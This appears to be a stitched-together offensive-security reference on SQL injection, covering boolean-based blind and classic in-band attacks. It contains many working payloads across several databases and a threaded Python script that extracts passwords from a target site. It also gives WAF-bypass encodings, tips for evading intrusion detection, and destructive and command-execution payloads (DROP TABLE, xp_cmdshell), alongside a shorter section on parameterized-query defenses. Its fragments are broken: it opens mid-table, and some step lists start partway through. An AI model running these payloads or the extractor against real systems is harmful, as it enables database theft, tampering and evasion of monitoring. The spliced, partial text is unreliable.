| HTTP request smuggling | `pip install smuggler` |\n| HTTP Request Smuggler (Burp ext.) | Smuggling via Burp | Burp Suite BApp Store |\n| param-miner (Burp ext.) | Cache poisoning parameter discovery | Burp Suite BApp Store |\n\n---\n\n## Deserialization\n\n| Tool | Purpose | Insta # Boolean-Based Blind SQL Injection

**CAT-01 > SQL Injection > Boolean-Based Blind**

---

## Overview

When an application constructs SQL queries by concatenating user-supplied input without parameterization, an attacker can inject conditional SQL expressions that alter the query's boolean logic. In boolean-based blind SQL injection, the injected condition forces the database to evaluate a true-or-false question, and the application leaks the answer through an observable behavioral difference -- a change in page content, response size, HTTP status code, or the presence of a specific HTML element. The attacker never sees query results directly. Instead, they reconstruct data one character (or one bit) at a time by asking hundreds of binary questions: "Is the first character of the admin password greater than 'm'?" If true, the page renders normally. If false, the page changes. By halving the search space with each question (binary search), the attacker extracts each character in approximately 7 HTTP requests.

The root cause is identical to all SQL injection: failure to separate data from code. The application treats attacker-controlled input as part of the SQL command structure rather than as a literal data value. What distinguishes boolean-based blind from classic SQL injection is the absence of visible output -- no query results displayed, no error messages leaked. The "blind" qualifier means the attacker must infer information through side channels rather than reading it directly from the response.

The prerequisite is minimal: any parameter whose value is interpolated into a SQL WHERE clause, ORDER BY, HAVING, or similar conditional context. This includes URL query parameters, POST body fields, HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie), JSON API fields, GraphQL arguments, and path segments. The parameter need not be the primary one -- analytics tracking cookies, sort-order fields, and pagination offsets are frequent vectors because developers consider them low-risk and skip sanitization.

Impact is identical to unrestricted SQL injection: full database read access (credentials, PII, financial records, session tokens), potential data modification or deletion, and in some database configurations (MSSQL with xp_cmdshell, PostgreSQL with COPY TO PROGRAM), escalation to operating system command execution. The only practical difference is speed -- blind extraction is slower than UNION-based injection, but automated tools like sqlmap reduce a 20-character password extraction from hours of manual work to under 60 seconds.

Boolean-based blind SQL injection has been present in the OWASP Top 10 continuously since 2004 and in the CWE Top 25 every year from 2019 through 2025. CAPEC-7 rates the likelihood of attack as High and skill required as Medium. CWE-89 rates exploitability as High. Resources required: none.

## Understanding From Zero

### The Core Concept (No Jargon)

Imagine a locked building with a doorbell. You cannot see inside, and nobody will open the door to show you anything. But the doorbell has a peculiar behavior: when you ring it with a TRUE statement, the light above the door turns green. When you ring it with a FALSE statement, the light stays off.

You cannot ask the building to hand you the combination to the safe. But you CAN ask yes-or-no questions:

- "Is the first digit of the combination greater than 5?" Green light = yes.
- "Is it greater than 7?" No light = no.
- "Is it greater than 6?" Green light = yes.
- "Is it equal to 7?" Green light = yes.

Four questions, and you know the first digit is 7. Repeat for each digit. That is boolean-based blind SQL injection: asking a database yes-or-no questions through a web application that unintentionally reveals the answers through behavioral changes.

### What's Actually Happening (Technical)

The application has code like this (PHP example):

\`\`\`php
// VULNERABLE: user input concatenated into SQL
$trackingId = $_COOKIE['TrackingId'];
$query = "SELECT * FROM tracking WHERE id = '" . $trackingId . "'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    echo '<p>Welcome back!</p>';
}
\`\`\`

When the user sends a normal cookie value \`abc123\`, the query becomes:

\`\`\`sql
SELECT * FROM tracking WHERE id = 'abc123'
\`\`\`

When the attacker sends \`abc123' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' --\`, the query becomes:

\`\`\`sql
SELECT * FROM tracking WHERE id = 'abc123' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' --'
\`\`\`

If the first character of the admin password IS \`s\`, the AND condition is true, the row is returned, and "Welcome back!" appears. If NOT, the AND makes the overall WHERE clause false, no row is returned, and "Welcome back!" is absent. The attacker sees the difference and knows the character.

### Why The Application Doesn't Stop This

The application trusts the input. It assumes the cookie value is just a tracking ID -- a harmless string. It never validates that the value contains only alphanumeric characters, and it concatenates the raw value directly into the SQL string. The database parser cannot distinguish between the developer's intended SQL structure and the attacker's injected SQL because they are delivered as a single undifferentiated string.

Error message suppression does not help. CAPEC-7 explicitly states: "Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages."

### What An Attacker Can Do

1. **Extract all database contents** -- usernames, password hashes, email addresses, credit card data, session tokens, API keys, PII
2. **Bypass authentication** -- extract admin credentials, or inject always-true conditions
3. **Modify or delete data** -- if stacked queries are supported (MSSQL, PostgreSQL)
4. **Escalate to OS command execution** -- via \`xp_cmdshell\` (MSSQL), \`COPY TO PROGRAM\` (PostgreSQL), \`INTO OUTFILE\` (MySQL)
5. **Pivot to other systems** -- extracted credentials frequently grant access to other services (credential reuse)

## How It Works

### Attack Flow

\`\`\`mermaid
flowchart TD
    A["Identify injectable parameter"] --> B["Send TRUE condition: ' AND 1=1--"]
    B --> C{"Response differs from baseline?"}
    C -->|"No"| D["Not injectable or different context"]
    C -->|"Yes"| E["Send FALSE condition: ' AND 1=2--"]
    E --> F{"Response matches baseline (false)?"}
    F -->|"No"| D
    F -->|"Yes"| G["Boolean blind SQLi confirmed"]
    G --> H["Determine DB type via fingerprint queries"]
    H --> I["Enumerate tables via boolean questions"]
    I --> J["Enumerate columns via boolean questions"]
    J --> K["Extract data character-by-character"]
    K --> L["Binary search: ASCII(SUBSTR(data,pos,1))>mid"]
    L --> M{"TRUE response?"}
    M -->|"Yes"| N["low = mid + 1"]
    M -->|"No"| O["high = mid - 1"]
    N --> P{"low > high?"}
    O --> P
    P -->|"No"| L
    P -->|"Yes"| Q["Character found: chr(low)"]
    Q --> R{"More positions?"}
    R -->|"Yes"| K
    R -->|"No"| S["Complete value extracted"]
\`\`\`

### Binary Search Explanation

ASCII printable characters range from 32 (space) to 126 (~). Binary search halves this range with each query:

\`\`\`
Target character: 's' (ASCII 115)

Query 1: ASCII(char) > 79?  YES  --> range narrows to 80-126
Query 2: ASCII(char) > 103? YES  --> range narrows to 104-126
Query 3: ASCII(char) > 115? NO   --> range narrows to 104-115
Query 4: ASCII(char) > 109? YES  --> range narrows to 110-115
Query 5: ASCII(char) > 112? YES  --> range narrows to 113-115
Query 6: ASCII(char) > 114? YES  --> range narrows to 115-115
Query 7: ASCII(char) = 115? YES  --> character is 's'

7 requests per character. For a 20-character password: 140 requests total.
Compare to linear brute force: up to 95 * 20 = 1,900 requests.
\`\`\`

### DB-Specific Conditional Syntax

| Database | Boolean Conditional | Substring | ASCII | Comment |
|----------|-------------------|-----------|-------|---------|
| MySQL | \`IF(cond, T, F)\` | \`SUBSTRING(s,p,l)\` / \`MID()\` / \`SUBSTR()\` | \`ASCII()\` / \`ORD()\` | \`-- \` (trailing space!) or \`#\` |
| PostgreSQL | \`CASE WHEN cond THEN T ELSE F END\` | \`SUBSTRING(s FROM p FOR l)\` | \`ASCII()\` | \`--\` |
| MSSQL | \`CASE WHEN\` / \`IIF()\` (2012+) | \`SUBSTRING(s,p,l)\` | \`ASCII()\` / \`UNICODE()\` | \`--\` |
| Oracle | \`CASE WHEN\` / \`DECODE()\` | \`SUBSTR(s,p,l)\` (NOT SUBSTRING) | \`ASCII()\` | \`--\` |
| SQLite | \`CASE WHEN\` / \`IIF()\` (3.32+) | \`SUBSTR(s,p,l)\` | \`UNICODE()\` (NOT ASCII) | \`--\` |

### Probe Payloads (True/False Pairs)

Send these pairs and compare responses. Different responses confirm injection.

\`\`\`sql
-- String context
' AND '1'='1        -- TRUE (normal behavior)
' AND '1'='2        -- FALSE (different behavior)

-- Numeric context
1 AND 1=1           -- TRUE
1 AND 1=2           -- FALSE

-- Parenthesized context
') AND ('1'='1      -- TRUE
') AND ('1'='2      -- FALSE

-- Double-parenthesized
')) AND (('1'='1    -- TRUE
')) AND (('1'='2    -- FALSE
\`\`\`

### Response Differential Analysis

| Signal Type | TRUE Indicator | FALSE Indicator |
|------------|---------------|-----------------|
| Content-based | "Welcome back" present | "Welcome back" absent |
| Size-based | Response is 4532 bytes | Response is 4218 bytes |
| Status-based | HTTP 200 | HTTP 302 or 500 |
| JSON-based | \`{"results": [...data...]}\` | \`{"results": []}\` |
| Redirect-based | No redirect | Redirect to /error |

**Step 6: Understand what happened**

Each request asked the database: "Is the Nth character of the admin password equal to X?" The database evaluated this as part of the WHERE clause. When true, the tracking query returned a row, and the application displayed "Welcome back!" When false, no row was returned, and the message was absent.

### Common Beginner Mistakes

1. **Forgetting to close the string context** -- the injected payload must produce valid SQL
2. **Not identifying the comment style** -- MySQL requires a space after \`--\`; use \`#\` as alternative
3. **Using \`OR 1=1\` carelessly** -- OWASP explicitly warns this can modify UPDATE/DELETE queries and cause data loss
4. **Not establishing a stable baseline** -- dynamic content (timestamps, CSRF tokens) can cause false positives
5. **Testing with \`AND 1=1\` when the original query returns no rows** -- the AND makes no difference on an empty result

## Techniques

### Level 0: Understanding the Concept

At this level, the attacker understands that SQL queries can be manipulated through user input, and that different responses indicate true/false conditions.

\`\`\`sql
-- The most basic boolean probe
' AND '1'='1     -- Does the page change?
' AND '1'='2     -- Does it change differently?
\`\`\`

### Level 1: First Boolean Probe and Basic Extraction

\`\`\`sql
-- Confirm injection exists
' AND 1=1--                                       -- TRUE condition
' AND 1=2--                                       -- FALSE condition

-- Determine if a specific table exists
' AND (SELECT COUNT(*) FROM users)>0--            -- TRUE if users table exists

-- Extract first character of a value (linear search)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
-- ... continue through alphabet until TRUE response

-- Determine string length
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10--
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=20--
\`\`\`

### Level 2: Binary Search Optimization and Multi-DB Syntax

\`\`\`sql
-- Binary search (7 requests per character instead of up to 95)
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>79--    -- midpoint of 32-126
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>103--   -- narrow further
-- Continue halving until exact value found

-- MySQL: use ORD + MID as synonyms
' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>79--

-- PostgreSQL: use CASE WHEN (no IF function)
' AND (CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>79 THEN TRUE ELSE FALSE END)--

-- MSSQL: use TOP 1 instead of LIMIT
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>79--

-- Oracle: use SUBSTR (not SUBSTRING) and ROWNUM
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>79--

-- SQLite: use UNICODE instead of ASCII
' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>79--
\`\`\`

### Level 3: WAF Bypass, ORM Exploitation, and API Context

\`\`\`sql
-- Comment-based space replacement (bypasses basic WAFs)
'/**/AND/**/ASCII(SUBSTRING(database(),1,1))>79--

-- MySQL version comments (executes on MySQL 5.0+, WAF sees as comment)
'/*!50000AND*/ASCII(/*!50000SUBSTRING*/(database(),1,1))>79--

-- Function synonym substitution (when SUBSTRING is blocked)
' AND ORD(MID(database(),1,1))>79--                          -- MySQL
' AND HEX(MID(database(),1,1))>'4F'--                        -- hex comparison

-- Hex encoding to avoid quotes
' AND SUBSTRING(database(),1,1)=0x75--                        -- 0x75 = 'u'
' AND SUBSTRING(database(),1,1)=CHAR(117)--                   -- CHAR(117) = 'u'

-- JSON body injection
-- POST: {"username": "admin' AND ASCII(SUBSTRING(database(),1,1))>79-- -"}

-- GraphQL injection
-- {"query": "{ user(id: \\"1' AND ASCII(SUBSTRING(database(),1,1))>79-- -\\") { name } }"}

-- Django ORM filter oracle (no SQL injection needed)
-- GET /api/articles/?created_by__user__password__startswith=pbkdf2_sha256
\`\`\`

### Level 4: Bit Shifting, Huffman Optimization, and JSON-in-SQL Bypass

\`\`\`sql
-- Bit shifting: extract each bit individually (exactly 7 requests per ASCII character)
' AND (ASCII(SUBSTR(user(),1,1)) >> 7)=0--     -- test bit 7 (MSB)
' AND (ASCII(SUBSTR(user(),1,1)) >> 6)=1--     -- test accumulated value after shift
' AND (ASCII(SUBSTR(user(),1,1)) >> 5)=3--     -- continue for all 7 bits
' AND (ASCII(SUBSTR(user(),1,1)) >> 4)=7--
' AND (ASCII(SUBSTR(user(),1,1)) >> 3)=14--
' AND (ASCII(SUBSTR(user(),1,1)) >> 2)=28--
' AND (ASCII(SUBSTR(user(),1,1)) >> 1)=57--

-- Bitwise AND alternative (when >> is filtered)
' AND (ASCII(SUBSTR(user(),1,1)) & 128)=0--    -- test bit 7
' AND (ASCII(SUBSTR(user(),1,1)) & 64)=64--    -- test bit 6
' AND (ASCII(SUBSTR(user(),1,1)) & 32)=32--    -- test bit 5

#!/usr/bin/env python3
"""
Boolean Blind SQL Injection Extractor
Binary search: 7 requests per character (ASCII range)
Supports threading for parallel position extraction
"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
TARGET_URL = "http://target.com/page"
PARAM_NAME = "id"
TRUE_INDICATOR = "Welcome"       # String present in TRUE response
COOKIE = {"session": "abc123"}
PROXY = {"http": "http://127.0.0.1:8080"}  # Route through Burp

# Injection template -- modify per target
PAYLOAD_TPL = "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)){op}{val}-- -"


def send_probe(pos, op, val):
    """Send boolean probe, return True if condition is TRUE."""
    payload = PAYLOAD_TPL.format(pos=pos, op=op, val=val)
    r = requests.get(
        TARGET_URL,
        params={PARAM_NAME: payload},
        cookies=COOKIE,
        proxies=PROXY,
        timeout=10
    )
    return TRUE_INDICATOR in r.text


def extract_char(pos):
    """Extract one character at given position via binary search."""
    lo, hi = 32, 126                       # printable ASCII range
    while lo <= hi:
        mid = (lo + hi) // 2
        if send_probe(pos, ">", mid):      # char > mid?
            lo = mid + 1
        else:
            if send_probe(pos, "=", mid):  # char == mid?
                return chr(mid)
            hi = mid - 1
    return None


def extract_string(length=32, workers=4):
    """Extract full string with optional parallelism."""
    result = {}
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(extract_char, p): p for p in range(1, length + 1)}
        for fut in futures:
            pos = futures[fut]
            ch = fut.result()
            if ch:
                result[pos] = ch
                assembled = ''.join(result.get(i, '?') for i in range(1, max(result) + 1))
                sys.stdout.write(f"\\r[+] {assembled}")
                sys.stdout.flush()
    print()
    return ''.join(result.get(i, '') for i in range(1, length + 1)).rstrip('\\x00')


if __name__ == "__main__":

    print(f"[*] Target: {TARGET_URL}")

**Step 1: Identify injectable parameters.** Test all inputs (GET, POST, Cookie, Header) with \`' AND '1'='1\` / \`' AND '1'='2\` pairs. Look for response differential.

**Step 2: Confirm boolean blind SQLi.** Verify consistent true/false behavioral differences. Eliminate false positives from dynamic content by testing multiple times.

**Step 3: Fingerprint the database engine.** Use DB-specific true conditions: \`connection_id()=connection_id()\` (MySQL), \`5::int=5\` (PostgreSQL), \`@@CONNECTIONS>0\` (MSSQL), \`ROWNUM=ROWNUM\` (Oracle), \`sqlite_version()=sqlite_version()\` (SQLite).

**Step 4: Enumerate database names.** Extract current database name character by character. Then enumerate other databases via \`information_schema.schemata\` (MySQL/PG/MSSQL) or \`all_users\` (Oracle).

**Step 5: Enumerate table names.** Extract from \`information_schema.tables\` (MySQL/PG/MSSQL), \`all_tables\` (Oracle), or \`sqlite_master\` (SQLite).

**Step 6: Enumerate column names.** Extract from \`information_schema.columns\` (MySQL/PG/MSSQL), \`all_tab_columns\` (Oracle), or \`sql\` column of \`sqlite_master\` (SQLite).

**Step 7: Determine row count and data length.** Use \`COUNT(*)\` for rows and \`LENGTH()\`/\`LEN()\` for individual field lengths before extraction.

**Step 8: Extract data using binary search.** For each character position, perform binary search on ASCII value. Use \`--threads\` with sqlmap or parallel Python script for speed.

**Step 9: Verify extracted data.** Log in with extracted credentials or validate extracted data against known patterns (hash formats, email patterns).

**Step 10: Document findings with evidence.** Capture request/response pairs for true and false conditions, timestamps, and complete extraction output.

11. **HPP (HTTP Parameter Pollution):** split payload across duplicate params
12. **HPF (Parameter Fragmentation):** distribute across different params bridged by comments
13. **Scientific notation:** \`1.e(1)\` as boolean true
14. **Chunked transfer encoding:** fragment HTTP body across chunks
15. **Unicode full-width:** \`%EF%BC%87\` (full-width apostrophe) normalizes to \`'\`
16. **Overlong UTF-8:** \`%C0%A7\` overlong encoding of \`'\`
17. **Content-Type switching:** URL-encoded to XML with entity encoding (\`&#x27;\` = \`'\`)
18. **H2C smuggling:** HTTP/2 cleartext upgrade bypasses HTTP/1.1-only WAF inspection
19. **libinjection fingerprint evasion:** \`<@\` operator, \`:=\` assignment, ODBC \`{fn}\` syntax
20. **WAFFLED mutations:** modify multipart boundaries, Content-Type variations, CRLF mutations

### IDS/SIEM Evasion

- **Low request rate:** Space requests over minutes/hours to avoid volume-based alerts
- **Randomize injection parameter:** Alternate between different injectable parameters
- **Vary payload structure:** Use different functions (SUBSTRING vs MID vs SUBSTR) across requests
- **Encode payloads differently per request:** Alternate between hex, URL encoding, and plain text
- **Use legitimate User-Agent strings:** Avoid fingerprinting as automated tool

### RASP Bypass

RASP (Runtime Application Self-Protection) monitors SQL queries at the application layer, making bypass significantly harder. Potential approaches:
- Second-order injection (payload stored then executed in different context, may bypass per-request RASP)
- ORM-level filter oracles that don't generate raw SQL the RASP recognizes as injection
- Protocol-level smuggling (DEF CON 32 technique) that operates below the RASP instrumentation layer

### Minimal Footprint Techniques

- Extract only what you need (target specific tables/columns)
- Use binary search (7 requests/char) not linear scan (95 requests/char)
- Use \`--predict-output\` in sqlmap for statistical optimization
- Prefer bit-shifting (deterministic 7 requests) over binary search (variable 1-7)
- Use DNS OOB exfiltration to extract entire values in single requests where possible

## Variations and Edge Cases

### Content-Based vs Status-Based vs Redirect-Based Boolean

| Variant | TRUE Signal | FALSE Signal | Example |
|---------|-----------|-------------|---------|
| Content-based | "Welcome back" in body | "Welcome back" absent | PortSwigger canonical lab |
| Size-based | Response 4532 bytes | Response 4218 bytes | Search result count changes |
| Status-based | HTTP 200 | HTTP 500 (error) | Conditional error oracle |
| Redirect-based | HTTP 200 | HTTP 302 redirect | Auth check with redirect |
| JSON-based | \`{"count": 5}\` | \`{"count": 0}\` | API returning filtered results |
| Header-based | Different Set-Cookie | Standard Set-Cookie | Session behavior differences |

### Conditional Error Variant

When page content does not change between true/false, but the application handles database errors differently (200 vs 500):

\`\`\`sql
-- TRUE triggers divide-by-zero, application returns 500
' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 'a' END)='a'--

-- FALSE returns normally, application returns 200
-- The error IS the boolean signal
\`\`\`

### LIKE-Based Boolean (Navidrome CVE-2024-47062)

When a parameter is used in a LIKE clause, wildcard characters become the injection vector:

\`\`\`
GET /api/items?password=A%     -- returns results if any password starts with 'A'
GET /api/items?password=AB%    -- narrows to passwords starting with 'AB'
GET /api/items?username=%       -- wildcard matches ALL usernames
\`\`\`

This is not traditional SQL injection -- no quote escaping needed. The LIKE operator's wildcard semantics become the vulnerability.

### INSERT/UPDATE Context Boolean

When injection is in an INSERT or UPDATE statement:

\`\`\`sql
-- INSERT context: result visible in another page/API
'; INSERT INTO logs(msg) VALUES((SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))>96 THEN 'YES' ELSE 'NO' END FROM users LIMIT 1));--

-- UPDATE context: modify observable data based on condition
'; UPDATE products SET price=CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96 THEN 9999 ELSE 1 END WHERE id=1;--
\`\`\`

### Second-Order Boolean Blind

The payload is stored by one request and executed by a different one:

\`\`\`
1. POST /api/report {"date": "2024-08-15' AND 1=1--"}
   Server stores the malicious date value in database

2. GET /api/report/ExportToExcel
   Server uses stored value in new query without sanitization
   Boolean condition evaluated in the export query context
\`\`\`

Detection pattern: inject in one endpoint, observe in another. Second-order blind is harder to detect because the injection point and observation point are decoupled.

## Modern Stack Specifics

### Framework Vulnerability Patterns

| Framework | Language | Safe Pattern | Vulnerable Pattern | Notes |
|-----------|----------|-------------|-------------------|-------|
| Django | Python | \`User.objects.filter(id=input)\` | \`User.objects.raw(f"...{input}...")\` | Also: \`extra()\`, JSONField CVE-2024-42005 |
| Rails | Ruby | \`User.where("id = ?", input)\` | \`User.where("id = #{input}")\` | Also: \`annotate()\` CVE-2023-22794 |
| Express/Sequelize | Node.js | \`query('...?', [input])\` | \`\` query(\`...\${input}...\`) \`\` | Template literals bypass parameterization |
| Spring/Hibernate | Java | \`setParameter("id", input)\` | \`createQuery("..."+input)\` | HQL injection identical to SQL injection |
| Laravel/Eloquent | PHP | \`DB::select('...?', [$input])\` | \`DB::select("...$input...")\` | PHP variable interpolation |
| Flask/SQLAlchemy | Python | \`execute("...":id", {"id": input})\` | \`execute(f"...{input}...")\` | f-strings bypass parameterization |
| Prisma | Node.js | \`\` $queryRaw\`...\${input}\` \`\` (tagged) | \`$queryRawUnsafe(...)\` | Tagged templates safe; raw strings not |
| GORM | Go | \`Where("id = ?", input)\` | \`Raw(fmt.Sprintf("...%s", input))\` | Sprintf injection |

### ORM Pitfalls

Even when the ORM is used "correctly," certain features create injection opportunities:

- **Django \`extra()\` and \`raw()\`** -- deprecated but functional; common in legacy code
- **Django JSONField** -- CVE-2024-42005: \`values()\` and \`values_list()\` with JSONField allow key injection
- **Rails \`annotate()\`** -- CVE-2023-22794: comment escaping allows SQL breakout
- **Prisma \`$queryRawUnsafe\`** -- explicitly bypasses parameterization (the "Unsafe" is a hint)
- **Any ORM's \`orderBy()\` with user input** -- ORDER BY is inherently unparameterizable in most ORMs; CVE-2024-49203 (Querydsl)

### Cloud and Serverless Context

- **AWS Lambda + RDS:** Same SQLi risk; Lambda timeout (15 min max) limits but does not prevent extraction
- **Cloud SQL (GCP):** No difference in vulnerability; managed database does not prevent application-level SQLi
- **Azure SQL:** Managed service provides audit logging but no injection prevention
- **Serverless DB (PlanetScale, Neon):** Still vulnerable if application concatenates input

### API Context (REST, GraphQL, gRPC)

- **REST APIs** with JSON bodies: Injection in string fields passed to queries
- **GraphQL**: Filter arguments, sort parameters, and nested queries are primary vectors
- **gRPC**: Protobuf string fields passed to SQL queries (less common but possible)
- **Batch/bulk endpoints**: Multiple injection opportunities per request; useful for parallel extraction

### Headless/SPA Applications

Single-page applications that communicate via XHR/fetch to API backends:
- All injection occurs at the API level, not in form submissions
- Response differentials may be in JSON structure rather than HTML content
- WebSocket connections may carry injectable parameters with no WAF inspection

## Defensive Countermeasures

### Parameterized Queries (Code Examples)

**Java (PreparedStatement):**
\`\`\`java
String username = request.getParameter("username");
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
ResultSet results = stmt.executeQuery();
\`\`\`

**Python (psycopg2 / mysql-connector):**
\`\`\`python
username = request.args.get("username")
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
results = cursor.fetchall()
\`\`\`

**PHP (PDO):**
\`\`\`php
$username = $_POST['username'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
$results = $stmt->fetchAll();
\`\`\`

**C# (.NET):**
\`\`\`csharp
string username = Request.QueryString["username"];
string query = "SELECT * FROM users WHERE username = @username";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@username", username);
SqlDataReader reader = cmd.ExecuteReader();
\`\`\`

**Node.js (pg / mysql2):**
\`\`\`javascript
const username = req.query.username;
const result = await pool.query(
    "SELECT * FROM users WHERE username = $1",
    [username]
);
\`\`\`

### ORM Safe Patterns vs Unsafe Patterns

| ORM | Safe | Unsafe |
|-----|------|--------|
| Django | \`User.objects.filter(id=input)\` | \`User.objects.raw(f"...{input}...")\` |
| Rails | \`User.where("id = ?", input)\` | \`User.where("id = #{input}")\` |
| Sequelize | \`query('...?', [input])\` | \`\` query(\`...\${input}\`) \`\` |
| Hibernate | \`setParameter("id", input)\` | \`createQuery("..."+input)\` |
| Prisma | \`\` $queryRaw\`...\${input}\` \`\` | \`$queryRawUnsafe(...)\` |
| SQLAlchemy | \`execute("...:id", {"id": input})\` | \`execute(f"...{input}...")\` |

### Defense-in-Depth

| Layer | Defense | Effectiveness Against Boolean Blind | Notes |
|-------|---------|-------------------------------------|-------|
| 1. Code | Parameterized queries | Eliminates vulnerability | Primary defense. Non-negotiable. |
| 2. Code | ORM proper usage | High (when used correctly) | Avoid raw queries, validate filter inputs |
| 3. Code | Allow-list validation | Supplementary | For table/column names, sort orders |
| 4. Architecture | Least privilege DB accounts | Limits impact | Separate read/write accounts per function |
| 5. Architecture | SQL views | Limits exposure | Expose hashed passwords, not raw |
| 6. Network | WAF | Detects many attacks | Bypassable; defense-in-depth only |
| 7. Runtime | RASP | High detection rate | Most expensive; hardest to bypass |
| 8. Monitoring | SIEM + DB audit logs | Reactive detection | Binary search patterns in logs |

### What Does NOT Work (As Sole Defense)

| "Defense" | Why It Fails |
|-----------|-------------|
| Escaping user input alone | Fragile, DB-specific, bypassed by encoding tricks. OWASP: "STRONGLY DISCOURAGED" |
| WAF alone | 20+ documented bypass categories; JSON-in-SQL bypassed 5 major vendors in 2022 |
| ORM alone | \`raw()\`, \`extra()\`, operator injection, JSONField exploits all bypass ORM protections |
| Error message suppression | CAPEC-7: "suppression alone is not sufficient to prevent SQL Injection" |
| Client-side validation | Trivially bypassed by modifying requests directly |
| Input length limits | Payloads can be shortened; \`' OR 1=1--\` is 12 characters |

## Overview

Classic SQL injection -- also called in-band SQL injection -- is a code injection technique where an attacker modifies the application's intended SQL query logic by inserting SQL syntax through unsanitized input, and receives the result through the application's **normal output channel**. The "in-band" designation means the same communication channel used to deliver the malicious input also returns the consequences: the web page already displaying data now displays different data, a login form that should reject bad credentials now grants access, or a registration form that should create one account creates a backdoor instead.

The mechanism is string concatenation without boundary enforcement. When an application constructs SQL queries by concatenating user input directly into the query string, it cannot distinguish between data (what the user typed) and code (the SQL instructions). The user's input becomes part of the query's syntactic structure. A single quote character (\`'\`) breaks out of a string literal context. A double dash (\`--\`) comments out the remainder of the query. An \`OR 1=1\` clause transforms a selective filter into an unconditional truth. The database runs the modified query faithfully because from its perspective, it received a syntactically valid SQL statement.

This vulnerability class is defined by CWE-89 as: "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command." CAPEC-66 rates the likelihood of attack as High and the skill requirement as Low -- basic SQL knowledge suffices for exploitation.

Classic in-band SQLi encompasses several attack patterns within its scope: WHERE clause manipulation to retrieve hidden data, authentication bypass via comment truncation or tautology, stacked (piggybacked) queries for arbitrary DML/DDL, INSERT/UPDATE/DELETE statement injection for data manipulation, ORDER BY clause injection for conditional data leakage, second-order (stored) injection where the payload persists in the database and fires on a later query, SQL truncation attacks exploiting column length limits, and GBK wide-byte injection bypassing quote escaping through multi-byte character encoding.

Despite being the oldest and most documented web vulnerability class, classic in-band SQLi remains the most prevalent category in real-world CVEs. The MOVEit Transfer breach (CVE-2023-34362) affected 2,500+ organizations through a textbook unauthenticated SQLi. Microsoft SCCM (CVE-2024-43468, CVSS 9.8), Apache Traffic Control (CVE-2024-45387, CVSS 9.9), and PostgreSQL itself (CVE-2025-1094, CVSS 8.1) all shipped exploitable injection flaws between 2023 and 2025. The ResumeLooters campaign stole 2.1 million records from 65 websites using sqlmap against classic injection points. Academic research from IEEE ICSECS 2023 confirms classic in-band SQLi remains the dominant subtype in NVD CVE data.

## Understanding From Zero

### Analogy

Imagine a library clerk with a form. You fill in a request slip: "Find me books in the **Science** section." The clerk walks to the catalog and looks up everything in Science. Now imagine you write on the slip: "Find me books in the **Science section OR just give me everything**." The clerk reads the whole slip as one instruction, walks to the catalog, and brings back every book in the library. The clerk trusted the form. There was no rule saying "only accept category names" -- the clerk processed whatever was written, and your added instruction became part of the request.

SQL injection works identically. The application has a template query with a blank to fill in. Your input fills the blank. But if your input contains SQL syntax, it becomes part of the query's logic rather than just its data.

### Vulnerable Code vs. What Gets Injected

**The application's intended query (PHP example):**

\`\`\`php
$category = $_GET['category'];
$query = "SELECT * FROM products WHERE category = '$category' AND released = 1";
\`\`\`

**Normal use -- user selects "Electronics":**

\`\`\`sql
SELECT * FROM products WHERE category = 'Electronics' AND released = 1
\`\`\`

Returns only released products in Electronics. Correct behavior.

**Attack -- user submits \`Electronics' OR 1=1--\`:**

\`\`\`sql
SELECT * FROM products WHERE category = 'Electronics' OR 1=1--' AND released = 1
\`\`\`

The injected \`'\` closes the string literal. \`OR 1=1\` makes the entire WHERE clause true for every row. \`--\` comments out the remaining \`AND released = 1\` restriction. The query returns every product in the database, including unreleased ones.

### Why the Application Does Not Stop This

The root cause is that the application conflates **code** and **data** in the same string. The database receives one string and parses it as a complete SQL statement. It has no way to know which parts came from the developer's template and which parts came from the user. The single quote character is simultaneously a piece of punctuation that means "end of string literal" and a character that a user might legitimately type. Without explicit separation of structure from data (parameterized queries), the boundary does not exist.

### Concrete Impacts

| Impact | Example |
|--------|---------|
| **Authentication bypass** | \`admin'--\` as username logs in as admin without a password |
| **Mass data exposure** | \`' OR 1=1--\` in a search field returns every record in the table |
| **Data modification** | Stacked query \`'; UPDATE users SET role='admin' WHERE username='attacker'--\` escalates privileges |
| **Data destruction** | \`'; DROP TABLE users--\` deletes the entire user table |
| **Remote code execution** | MSSQL: \`'; EXEC xp_cmdshell 'whoami'--\` runs OS commands |
| **Account takeover** | Second-order: register as \`admin'--\`, then trigger password reset |

### Primary Injection Points

| Input Vector | Example Location | Risk Level |

| Hidden form fields | Priced items, role selectors, internal IDs | Medium |

### High-Value Target Patterns

- **Login forms** -- Authentication bypass is the highest-impact, lowest-complexity attack
- **Search functionality** -- WHERE clause with user-controlled filter predicates
